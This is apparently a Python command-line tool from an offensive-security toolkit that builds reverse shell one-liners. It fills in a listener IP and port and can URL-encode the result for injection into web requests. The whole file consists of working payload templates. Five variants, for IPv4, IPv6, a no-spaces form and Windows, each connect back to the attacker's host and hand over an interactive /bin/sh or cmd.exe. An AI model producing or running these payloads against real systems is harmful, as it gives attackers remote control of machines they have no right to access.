import click
from colorama import Fore
from urllib.parse import quote

VARIANTS = {
    "1": ("Python IPv4 (pty)", "python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'"),
    "2": ("Python IPv4 (subprocess)", "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"),
    "3": ("Python IPv4 no-spaces (pty)", "python -c 'a=__import__;s=a(\"socket\").socket;o=a(\"os\").dup2;p=a(\"pty\").spawn;c=s();c.connect((\"{ip}\",{port}));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(\"/bin/sh\")'"),
    "4": ("Python IPv6 (pty)", "python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((\"{ip}\",{port},0,2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'"),
    "5": ("Python Windows (threading)", "python.exe -c \"import socket,os,threading,subprocess as sp;p=sp.Popen(['cmd.exe'],stdin=sp.PIPE,stdout=sp.PIPE,stderr=sp.STDOUT);s=socket.socket();s.connect(('{ip}',{port}));threading.Thread(target=exec,args=(\\\"while(True):o=os.read(p.stdout.fileno(),1024);s.send(o)\\\",globals()),daemon=True).start();threading.Thread(target=exec,args=(\\\"while(True):i=s.recv(1024);os.write(p.stdin.fileno(),i)\\\",globals())).start()\""),
}

@click.command()
@click.argument("listener_ip")
@click.argument("listener_port")
@click.option("-r", "--raw", is_flag=True, default=False, help="Enable raw output.")
@click.option("-u", "--urlencode", is_flag=True, default=False, help="URL-encode the output.")
@click.option("-v", "--variant", default="1", type=click.Choice(list(VARIANTS.keys())),
              help="1=IPv4 pty, 2=IPv4 subprocess, 3=IPv4 no-spaces, 4=IPv6, 5=Windows")
def command(listener_ip, listener_port, raw, urlencode, variant):
    """Return Python reverse shell"""
    label, template = VARIANTS[variant]
    cmd = template.format(ip=listener_ip, port=listener_port)
    if urlencode:
        cmd = quote(cmd)
    if not raw:
        click.secho(f"{Fore.LIGHTGREEN_EX}{label}:\n\t{Fore.WHITE}{cmd}")
    else:
        click.secho(cmd, nl=False)
